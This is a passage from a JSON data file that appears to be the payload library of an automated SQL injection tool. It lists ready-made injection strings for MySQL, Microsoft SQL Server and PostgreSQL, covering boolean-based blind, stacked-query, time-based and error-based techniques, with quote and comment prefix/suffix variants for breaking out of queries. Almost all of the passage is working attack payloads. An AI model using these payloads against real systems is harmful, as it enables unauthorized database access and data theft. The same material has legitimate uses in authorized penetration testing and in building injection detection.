      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "UPDATEXML(0,CONCAT(0x7e,0x72306f746833783439,0x7e),0)",
    "vector": "UPDATEXML(0,CONCAT(0x7e,[INFERENCE],0x7e),0)",
    "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": "",
      "suf": ""
     },
     {
      "pref": "(",
      "suf": ")"
     },
     {
      "pref": " AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": " AND ",
      "suf": "#"
     },
     {
      "pref": "' AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' AND ",
      "suf": "#"
     },
     {
      "pref": "\" AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" AND ",
      "suf": "#"
     },
     {
      "pref": ") AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") AND ",
      "suf": "#"
     },
     {
      "pref": "') AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') AND ",
      "suf": "#"
     },
     {
      "pref": "\") AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") AND ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "EXTRACTVALUE(0,CONCAT(0x7e,0x72306f746833783439,0x7e))",
    "vector": "EXTRACTVALUE(0,CONCAT(0x7e,[INFERENCE],0x7e))",
    "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": "",
      "suf": ""
     },
     {
      "pref": "(",
      "suf": ")"
     },
     {
      "pref": " AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": " AND ",
      "suf": "#"
     },
     {
      "pref": "' AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' AND ",
      "suf": "#"
     },
     {
      "pref": "\" AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" AND ",
      "suf": "#"
     },
     {
      "pref": ") AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") AND ",
      "suf": "#"
     },
     {
      "pref": "') AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') AND ",
      "suf": "#"
     },
     {
      "pref": "\") AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") AND ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "AND UPDATEXML(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e),0)",
    "vector": "AND UPDATEXML(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e),0)",
    "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "AND UPDATEXML(0,CONCAT_WS('(', '~','r0oth3x49','~'),0)",
    "vector": "AND UPDATEXML(0,CONCAT_WS('(', '~',[INFERENCE],'~'),0)",
    "title": "MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "OR UPDATEXML(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e),0)",
    "vector": "AND UPDATEXML(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e),0)",
    "title": "MySQL >= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "PROCEDURE ANALYSE(UPDATEXML(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e),0),1)",
    "vector": "PROCEDURE ANALYSE(UPDATEXML(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e),0),1)",
    "title": "MySQL >= 5.1 error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (PROCEDURE ANALYSE)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e))",
    "vector": "EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e))",
    "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": "",
      "suf": ""
     },
     {
      "pref": "(",
      "suf": ")"
     },
     {
      "pref": " AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": " AND ",
      "suf": "#"
     },
     {
      "pref": "' AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' AND ",
      "suf": "#"
     },
     {
      "pref": "\" AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" AND ",
      "suf": "#"
     },
     {
      "pref": ") AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") AND ",
      "suf": "#"
     },
     {
      "pref": "') AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') AND ",
      "suf": "#"
     },
     {
      "pref": "\") AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") AND ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "OR EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e))",
    "vector": "OR EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e))",
    "title": "MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   }
  ]
 },
 "Microsoft SQL Server": {
  "boolean-based": [
   {
    "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
    "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
    "title": "Microsoft SQL Server/Sybase boolean-based blind - Parameter replace",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": "",
      "suf": ""
     }
    ]
   },
   {
    "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
    "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
    "title": "Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": "",
      "suf": ""
     }
    ]
   }
  ],
  "inline-query": [],
  "stacked-queries": [
   {
    "payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'",
    "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
    "title": "Microsoft SQL Server/Sybase stacked queries",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": ";",
      "suf": ""
     },
     {
      "pref": "';",
      "suf": ""
     },
     {
      "pref": "\";",
      "suf": ""
     },
     {
      "pref": ");",
      "suf": ""
     },
     {
      "pref": "');",
      "suf": ""
     },
     {
      "pref": "\");",
      "suf": ""
     }
    ]
   },
   {
    "payload": "IF(5689=5689) WAITFOR DELAY '0:0:[SLEEPTIME]'",
    "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
    "title": "Microsoft SQL Server/Sybase stacked queries (comment)",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": ";",
      "suf": "--"
     },
     {
      "pref": "';",
      "suf": "--"
     },
     {
      "pref": "\";",
      "suf": "--"
     },
     {
      "pref": ");",
      "suf": "--"
     },
     {
      "pref": "');",
      "suf": "--"
     },
     {
      "pref": "\");",
      "suf": "--"
     }
    ]
   }
  ],
  "time-based": [
   {
    "payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'",
    "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
    "title": "Microsoft SQL Server/Sybase time-based blind (IF)",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "--"
     },
     {
      "pref": "' ",
      "suf": "--"
     },
     {
      "pref": "\" ",
      "suf": "--"
     },
     {
      "pref": ") ",
      "suf": "--"
     },
     {
      "pref": "') ",
      "suf": "--"
     },
     {
      "pref": "\") ",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "IF(5689=5689) WAITFOR DELAY '0:0:[SLEEPTIME]'",
    "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
    "title": "Microsoft SQL Server/Sybase time-based blind (IF - comment)",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "--"
     },
     {
      "pref": "' ",
      "suf": "--"
     },
     {
      "pref": "\" ",
      "suf": "--"
     },
     {
      "pref": ") ",
      "suf": "--"
     },
     {
      "pref": "') ",
      "suf": "--"
     },
     {
      "pref": "\") ",
      "suf": "--"
     }
    ]
   }
  ],
  "error-based": [
   {
    "payload": "AND 3082=(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
    "vector": "AND 3082=(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
    "title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "OR 3082=(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
    "vector": "OR 3082=(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
    "title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "AND 3082 IN (SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
    "vector": "AND 3082 IN (SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
    "title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "OR 3082 IN (SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
    "vector": "OR 3082 IN (SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68)))",
    "title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "AND 3082=CONVERT(INT,(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
    "vector": "AND 3082=CONVERT(INT,(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
    "title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "OR 3082=CONVERT(INT,(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
    "vector": "OR 3082=CONVERT(INT,(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
    "title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "AND 3082=CONCAT(CHAR(126),(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
    "vector": "AND [RANDNUM]=CONCAT(CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126),[INFERENCE],CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))",
    "title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "AND 3082=CONVERT(CHAR(126),(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+(SELECT (1337))+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
    "vector": "AND 3082=CONVERT(CHAR(126),(SELECT (CHAR(114)+CHAR(48)+CHAR(111)+CHAR(116)+CHAR(104)+CHAR(51)+CHAR(120)+CHAR(52)+CHAR(57)+CHAR(126)+[INFERENCE]+CHAR(126)+CHAR(69)+CHAR(78)+CHAR(68))))",
    "title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "AND 3082 IN (SELECT ('r0oth3x49~1337~END'))",
    "vector": "AND 3082 IN (SELECT ('~'+[INFERENCE]))",
    "title": "Microsoft SQL Server/Sybase AND string error-based - WHERE or HAVING clause (IN)",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "--"
     },
     {
      "pref": "' ",
      "suf": "--"
     },
     {
      "pref": "\" ",
      "suf": "--"
     },
     {
      "pref": ") ",
      "suf": "--"
     },
     {
      "pref": "') ",
      "suf": "--"
     },
     {
      "pref": "\") ",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "OR 3082 IN (SELECT ('r0oth3x49~1337~END'))",
    "vector": "OR 3082 IN (SELECT ('~'+[INFERENCE]))",
    "title": "Microsoft SQL Server/Sybase OR string error-based - WHERE or HAVING clause (IN)",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "AND 3082=(SELECT ('r0oth3x49~1337~END'))",
    "vector": "OR 3082=(SELECT ('~'+[INFERENCE]))",
    "title": "Microsoft SQL Server/Sybase AND string error-based - WHERE or HAVING clause",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "OR 3082=(SELECT ('r0oth3x49~1337~END'))",
    "vector": "OR 3082=(SELECT ('~'+[INFERENCE]))",
    "title": "Microsoft SQL Server/Sybase OR string error-based - WHERE or HAVING clause",
    "dbms": "Microsoft SQL Server",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   }
  ]
 },
 "PostgreSQL": {
  "boolean-based": [
   {
    "payload": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('4568' AS NUMERIC) END)) IS NULL",
    "vector": "AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('4568' AS NUMERIC) END)) IS NULL",
    "title": "PostgreSQL AND boolean-based blind - WHERE or HAVING clause",
    "dbms": "PostgreSQL",
    "comments": [
     {
      "pref": " ",
      "suf": ""
     },
     {
      "pref": " ",
      "suf": "--"
     },
     {
      "pref": "' ",
      "suf": ""
     },
     {
      "pref": "' ",
      "suf": "--"
     },
     {
      "pref": "\" ",
      "suf": ""
     },
     {
      "pref": "\" ",
      "suf": "--"
     },
     {
      "pref": ") ",
      "suf": ""
     },
     {
      "pref": ") ",
      "suf": "--"
     },
     {
      "pref": "') ",
      "suf": ""
     },
     {
      "pref": "') ",
      "suf": "--"
     },
     {
      "pref": "\") ",
      "suf": ""
     },
     {
      "pref": "\") ",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('4568' AS NUMERIC) END)) IS NULL",
    "vector": "OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('4568' AS NUMERIC) END)) IS NULL",
    "title": "PostgreSQL AND boolean-based blind - WHERE or HAVING clause",
    "dbms": "PostgreSQL",
    "comments": [
     {
      "pref": " ",
      "suf": ""
     },
     {
      "pref": " ",
      "suf": "--"
     },
     {
      "pref": "' ",
      "suf": ""
     },
     {
      "pref": "' ",
      "suf": "--"
     },
     {
      "pref": "\" ",
      "suf": ""
     },
     {
      "pref": "\" ",
      "suf": "--"
     },
     {
      "pref": ") ",
      "suf": ""
     },
     {
      "pref": ") ",
      "suf": "--"
     },
     {
      "pref": "') ",
      "suf": ""
     },
     {
      "pref": "') ",
      "suf": "--"
     },
     {
      "pref": "\") ",
      "suf": ""
     },
     {
      "pref": "\") ",
      "suf": "--"
     }
    ]
   }
  ],
  "inline-query": [],
  "stacked-queries": [
   {
    "payload": "(SELECT 4564 FROM PG_SLEEP([SLEEPTIME]))",
    "vector": "AND 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
    "title": "PostgreSQL > 8.1 stacked queries",
    "dbms": "PostgreSQL",
    "comments": [
     {
      "pref": ";",
      "suf": ""
     },
     {
      "pref": "';",
      "suf": "--"
     },
     {
      "pref": "\";",
      "suf": "--"
     },
     {
      "pref": ");",
      "suf": "--"
     },
     {
      "pref": "');",
      "suf": "--"
     },
     {
      "pref": "\");",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))",
    "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1234 END))",
    "title": "PostgreSQL stacked queries (heavy query)",
    "dbms": "PostgreSQL",
    "comments": [
     {
      "pref": ";",
      "suf": ""
     },
     {
      "pref": "';",
      "suf": "--"
     },
     {
      "pref": "\";",
      "suf": "--"
     },
     {
      "pref": ");",
      "suf": "--"
     },
     {
      "pref": "');",
      "suf": "--"
     },
     {
      "pref": "\");",
      "suf": "--"
     }
    ]
   }
  ],
  "time-based": [
   {
    "payload": "AND 4564=(SELECT 4564 FROM PG_SLEEP([SLEEPTIME]))",
    "vector": "AND 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
    "title": "PostgreSQL > 8.1 AND time-based blind (comment)",
    "dbms": "PostgreSQL",
    "comments": [
     {
      "pref": " ",
      "suf": ""
     },
     {
      "pref": " ",
      "suf": "--"
     },
     {
      "pref": "' ",
      "suf": ""
     },
     {
      "pref": "' ",
      "suf": "--"
     },
     {
      "pref": "\" ",
      "suf": ""
     },
     {
      "pref": "\" ",
      "suf": "--"
     },
     {
      "pref": ") ",
      "suf": ""
     },
     {
      "pref": ") ",
      "suf": "--"
     },
     {
      "pref": "') ",
      "suf": ""
     },
     {
      "pref": "') ",
      "suf": "--"
     },
     {
      "pref": "\") ",
      "suf": ""
     },
     {
      "pref": "\") ",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "OR 9756=(SELECT 9756 FROM PG_SLEEP([SLEEPTIME]))",
    "vector": "OR 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
    "title": "PostgreSQL > 8.1 OR time-based blind (comment)",
    "dbms": "PostgreSQL",
    "comments": [
     {
      "pref": " ",
      "suf": ""
     },
     {
      "pref": " ",
      "suf": "--"
     },
     {
      "pref": "' ",
      "suf": ""
     },
     {
      "pref": "' ",
      "suf": "--"
     },
     {
      "pref": "\" ",
      "suf": ""
     },
     {
      "pref": "\" ",
      "suf": "--"
     },
     {
      "pref": ") ",
      "suf": ""
     },
     {
      "pref": ") ",
      "suf": "--"
     },
     {
      "pref": "') ",
      "suf": ""
     },
     {
      "pref": "') ",
      "suf": "--"
     },
     {
      "pref": "\") ",
      "suf": ""
     },
     {
      "pref": "\") ",
      "suf": "--"
     }
    ]
   }
  ],
  "error-based": [
   {
    "payload": "AND 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||1337::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
